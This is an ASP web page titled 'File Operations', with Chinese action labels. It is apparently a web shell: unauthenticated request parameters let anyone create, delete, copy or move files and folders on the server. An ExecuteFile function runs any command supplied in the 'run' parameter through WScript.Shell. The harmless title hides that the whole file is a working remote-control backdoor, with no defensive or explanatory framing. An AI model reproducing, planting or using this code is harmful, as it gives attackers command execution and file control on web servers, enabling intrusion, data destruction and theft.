<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">

<html>
<head>
	<title>File Operations</title>
</head>

<body>
<% 
select case request("action")
	case "执行"
		result=ExecuteFile(request("run"))
        case "del"
                result=DeleteFile(request("filename"))
        case "复制"
                result=copyfile(request("from"),request("to"))
        case "移动"
                result=movefile(request("from"),request("to"))
        case "创建文件"
                result=createfile(request("thispath")+"/"+request("filename"))
end select
select case request("folder")
        case "创建文件夹"
                result=createfolder(request("thispath")+"/"+request("foldername"))
        case "删除文件夹"
                result=deletefolder(request("foldername"))
        case "复制"
                result=copyfolder(request("from"),request("to"))
        case "移动"
                result=movefolder(request("from"),request("to"))
end select
function CreateFolder(folderCreate)
	Set fs = CreateObject("Scripting.FileSystemObject")
	Set a = fs.Createfolder(foldercreate)
response.write"Create&nbsp;"&folderCreate&"&nbsp;0k!But&nbsp;1t&nbsp;1s&nbsp;empty!"
end function
function deleteFolder(delfolder)
	Set fs = CreateObject("Scripting.FileSystemObject")
	Set a = fs.deletefolder(delfolder)
response.write"Delete&nbsp;"&delfolder&"&nbsp;0k!"
end function
function copyFolder(folderfrom,folderto)
	Set fs = CreateObject("Scripting.FileSystemObject")
	Set a = fs.copyfolder (folderfrom,folderto,true)
response.write "Check folder exist (" & folderFrom & ")="&cstr(fs.folderExists(FolderFrom))&"<BR>"
response.write "folderFrom="&folderFrom & " <br>folderTo="&folderTo&"<BR>"
    fs.CopyFolder folderFrom, folderTo,true
end function
function moveFolder(folderfrom,folderto)
	Set fs = CreateObject("Scripting.FileSystemObject")
	Set a = fs.movefolder (folderfrom,folderto)
response.write "Check folder exist (" & folderFrom & ")="&cstr(fs.folderExists(FolderFrom))&"<BR>"
response.write "folderFrom="&folderFrom & " <br>folderTo="&folderTo&"<BR>"
    fs.moveFolder folderFrom, folderTo
end function
function CreateFile(fileCreate)
	Set fs = CreateObject("Scripting.FileSystemObject")
	Set a = fs.CreateTextFile(filecreate, True)
response.write"Create&nbsp;"&fileCreate&"&nbsp;0k!But&nbsp;1t&nbsp;1s&nbsp;empty!"
	a.Close
end function

function FindFile(pfilePath)
    on error resume next 
    dim fs
    Set fs = CreateObject("Scripting.FileSystemObject")
response.write "filePath="&pfilePath&"<BR>"
    FindFile=fs.FileExists(pfilePath)
    if err>0 then
       err.clear
       findFile=false
    end if
end function 

function CopyFile(fileFrom,fileTo)
    on error resume next
    dim fs
    Set fs = CreateObject("Scripting.FileSystemObject")
response.write "Check file exist (" & fileFrom & ")="&cstr(fs.FileExists(FileFrom))&"<BR>"
response.write "fileFrom="&fileFrom & " <br>fileTo="&fileTo&"<BR>"
    fs.CopyFile fileFrom, fileTo,true
    if err>0 then 
       err.clear
       CopyFile=false
    else 
       CopyFile=True
    end if
end function
function moveFile(fileFrom,fileTo)
    on error resume next
    dim fs
    Set fs = CreateObject("Scripting.FileSystemObject")
   Set a = fs.moveFile(filefrom,fileto)
response.write "Check file exist (" & fileFrom & ")="&cstr(fs.FileExists(FileFrom))&"<BR>"
response.write "fileFrom="&fileFrom & " <br>fileTo="&fileTo&"<BR>"
    fs.moveFile fileFrom, fileTo
    if err>0 then 
       err.clear
       moveFile=false
    else 
      moveFile=True
    end if
end function

function DeleteFile(fileDel)
    on error resume next 
    dim fs
    Set fs = CreateObject("Scripting.FileSystemObject")
response.write "Check file exist (" & fileDel & ")="&cstr(fs.FileExists(fileDel))&"<BR>"    
    if fs.FileExists(fileDel) then        
       fs.DeleteFile fileDel,true
    end if
    if err>0 then 
       err.clear
       DeleteFile=false
    else 
       DeleteFile=True
    end if    
end function

function ExecuteFile(fileExe)
	Set WShShell = Server.CreateObject("WScript.Shell")
	RetCode = WShShell.Run(fileExe, 1, True)
	if RetCode = 0 Then
	    'There were no errors
		ExecuteFile=True
	else
    	ExecuteFile=False
	end if
response.write "Run&nbsp"&"&nbsp"&fileexe&"&nbsp"&executefile
end function
 %>


</body>
</html>
